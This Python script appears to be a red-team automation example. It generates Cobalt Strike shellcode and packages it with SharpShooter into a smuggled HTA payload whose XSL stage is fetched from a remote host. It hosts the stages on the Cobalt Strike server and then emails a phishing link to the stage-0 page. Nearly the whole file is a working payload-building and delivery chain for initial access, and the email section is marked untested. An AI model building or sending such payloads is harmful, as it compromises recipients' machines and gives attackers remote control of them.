#!/usr/local/bin/python3

# This is an example to automate some of the actions necessary to run sharpshooter more efficiently 

from payload_automation.striker import CSConnector
from payload_automation.artifactor import getHashes
import subprocess

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def Create_Message(Sender,Recipient,Title,Body):
		#Create Message
	print(1)
	msg = MIMEMultipart('alternative')
	msg['Subject'] = Title
	msg['From'] = Sender
	msg['To'] = Recipient
	HTML_Body = MIMEText(Body, 'html')
	msg.attach(HTML_Body)
	return msg

def Add_Attachment(msg,Attachment):
	#Addattachment
	print(2)
	part = MIMEBase('application', "octet-stream")
	part.set_payload(open(Attachment, "rb").read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', 'attachment; filename={}'.format(Attachment))
	msg.attach(part)
	return msg

def Send_Email(msg,SMTPServer):
	#Send Email
	print(3)
	mailserver = smtplib.SMTP(SMTPServer,25,timeout=7)
	mailserver.ehlo('localhost')
	mailserver.starttls()
	resp = mailserver.sendmail(msg['From'],[msg['To']], msg.as_string())
	print('[+] Email successfully sent to {}'.format(msg['To']))
	print(resp)
	mailserver.quit()

#SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl

# We need to get the x86 shellcode for our CS listener into /tmp/x86payload.bin
with CSConnector(
	cs_host="127.0.0.1", 
	cs_user="Fautline", 
	cs_directory="/Applications/Cobalt Strike 4.0/Cobalt Strike 4.0.app/Contents/Java") as cs:
		# This needs to become generate shellcode
	shellcode = cs.generateShellcode(
			listener="Localhost - HTTP",
			staged=False,
			x64=False 
			)

	shellfile = "/tmp/x86payload.bin"

	with open(shellfile, 'wb') as file:
		file.write(shellcode)

	# We need to run sharpshooter to generate the prefix.xsl file, so that we can then host it
	prefix = "foo"
	xsluri = "http://172.16.179.1/{}.xsl".format(prefix)
	template = "sharepoint"
	sharpshooter_path = "/Users/nameless/tools/SharpShooter/"

	ss_cmd = "python SharpShooter.py --stageless --dotnetver 2 --payload hta --output {} --rawscfile {} --smuggle --template {} --com xslremote --awlurl {}".format(
				prefix, shellfile, template, xsluri)

	subprocess.run(ss_cmd.split(), cwd=sharpshooter_path)


	# Then we connect to cobalt strike and host all of the files
	# If smuggling is enabled, we don't need to host the hta
	stage = 0
	stage_0_uri = ""
	for filetype in ['html', 'xsl']:
		file = "{}/output/{}.{}".format(sharpshooter_path, prefix, filetype)

		md5, sha1, sha256 = getHashes(file)
		if filetype == 'html':
			mime_type='text/html'
		else:
			mime_type='text/plain'
		hosted_uri = cs.hostPlainFile(file_path=file,
		 				uri="/{}.{}".format(prefix, filetype),
		 				mime_type=mime_type,
		 				description="Initial Access - Stage {} ({}) - MD5:{},SHA1:{},SHA256:{}".format(stage, filetype.upper(), md5, sha1, sha256))
		print("hosted stage {} at {}".format(stage, hosted_uri))
		if stage == 0:
			stage_0_uri = hosted_uri
		stage += 1

	# WARNING, UNTESTED CODE BELOW!

	email_body = """
	<HTML>
	<HEAD>
	<TITLE> SharpShooter XLS HTA with Cobalt Strike Test </TITLE>
	</HEAD>
	<BDOY>
	Please find the example <a href="{}"> here </a>
	</BODY>
	</HTML>
	""".format(stage_0_uri)

	msg = Create_Message("sender@example.com", "Recipient@example.com", "SharpShooter XLS HTA with Cobalt Strike Test", email_body)

	Send_Email(msg, "mx.example.com")